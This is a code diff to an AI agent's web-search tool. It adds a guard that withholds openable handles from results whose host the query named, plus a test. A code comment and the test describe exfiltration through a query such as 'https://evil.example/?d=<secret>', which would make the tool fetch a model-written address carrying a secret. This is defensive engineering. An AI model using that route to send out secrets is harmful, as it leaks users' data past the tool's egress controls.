@@ -948,7 +948,20 @@ impl Tool for WebSearch {
         if let Some(answer) = &response.answer {
             out.push_str(&format!("Synthesized answer: {answer}\n\n"));
         }
-        let urls: Vec<&str> = response.results.iter().map(|r| r.url.as_str()).collect();
+        // A result whose host is in the query gets no handle. `web_open` is
+        // blind only because its URL is one a backend returned rather than
+        // one the model wrote, and a backend that echoed a URL-shaped query
+        // back as a result would break exactly that: `web_search("https://
+        // evil.example/?d=<secret>")` would mint a handle to a destination
+        // the model composed (found in review of #284). No shipped backend is
+        // known to do it; the guard costs one lookup, and a host the query
+        // named is one the model could have chosen.
+        let echoed = |url: &str| query_names_host(query, url);
+        let urls: Vec<&str> = response
+            .results
+            .iter()
+            .map(|r| if echoed(&r.url) { "" } else { r.url.as_str() })
+            .collect();
         let handles = match &self.ledger {
             Some(ledger) => ledger.record(&urls),
             None => vec![None; urls.len()],
@@ -956,8 +969,16 @@ impl Tool for WebSearch {
         for (i, r) in response.results.iter().enumerate() {
             match &handles[i] {
                 Some(h) => out.push_str(&format!("{}. [{h}] {}\n   {}\n", i + 1, r.title, r.url)),
+                None if self.ledger.is_some() && echoed(&r.url) => out.push_str(&format!(
+                    "{}. {}\n   {}\n   (no handle: its address appears in the query, so opening it would be \
+                     fetching an address this conversation wrote)\n",
+                    i + 1,
+                    r.title,
+                    r.url
+                )),
                 None => out.push_str(&format!("{}. {}\n   {}\n", i + 1, r.title, r.url)),
             }
+
             if let Some(date) = &r.published {
                 out.push_str(&format!("   published: {date}\n"));
             }
@@ -972,6 +993,21 @@ impl Tool for WebSearch {
 
         // Everything above was written by strangers.
         Ok(ToolOutput::ok(out).from_outside())
+    }
+}
+
+/// Does `query` name the host of `url`? Case-insensitive, and a URL that
+/// does not parse, or has no host, is treated as named: a result nobody can
+/// vet gets no handle.
+fn query_names_host(query: &str, url: &str) -> bool {
+    match reqwest::Url::parse(url)
+        .ok()
+        .and_then(|u| u.host_str().map(str::to_ascii_lowercase))
+    {
+        Some(host) => query
+            .to_ascii_lowercase()
+            .contains(host.trim_start_matches("www.")),
+        None => true,
     }
 }
 
@@ -1452,6 +1488,66 @@ mod tests {
             .unwrap();
         assert!(!out.content.contains('['), "{}", out.content);
         assert!(!bare.description().contains("web_open"));
+    }
+
+    /// A backend that echoes a URL-shaped query back as a result must not
+    /// mint a handle for it: that would be a destination the model wrote.
+    #[tokio::test]
+    async fn a_result_whose_host_the_query_named_gets_no_handle() {
+        struct Echo;
+        #[async_trait]
+        impl SearchBackend for Echo {
+            fn id(&self) -> &str {
+                "echo"
+            }
+            fn egress(&self, _depth: Depth) -> Egress {
+                Egress::Blind
+            }
+            async fn search(&self, q: &str, _l: usize, _d: Depth) -> Result<SearchResponse> {
+                Ok(SearchResponse {
+                    results: vec![
+                        SearchResult {
+                            title: "echoed".into(),
+                            url: q.to_string(),
+                            snippet: String::new(),
+                            published: None,
+                            score: None,
+                        },
+                        SearchResult {
+                            title: "honest".into(),
+                            url: "https://example.org/about".into(),
+                            snippet: String::new(),
+                            published: None,
+                            score: None,
+                        },
+                    ],
+                    answer: None,
+                    backend: "echo".into(),
+                })
+            }
+        }
+        let ledger = Arc::new(ResultLedger::new());
+        let tool = WebSearch::new(Arc::new(SearchChain::new(vec![Box::new(Echo)])))
+            .with_ledger(Arc::clone(&ledger));
+        let out = tool
+            .call(
+                json!({"query": "https://Evil.example/?d=SECRET"}),
+                &ctx_with(None),
+            )
+            .await
+            .unwrap();
+        let handles: Vec<&str> = out
+            .content
+            .split('[')
+            .skip(1)
+            .filter_map(|r| r.split(']').next())
+            .collect();
+        assert_eq!(handles.len(), 1, "{}", out.content);
+        assert_eq!(
+            ledger.resolve(handles[0]).as_deref(),
+            Some("https://example.org/about")
+        );
+        assert!(out.content.contains("no handle"), "{}", out.content);
     }
 
     /// Forgetting is bounded and exact: past the cap the oldest handle is
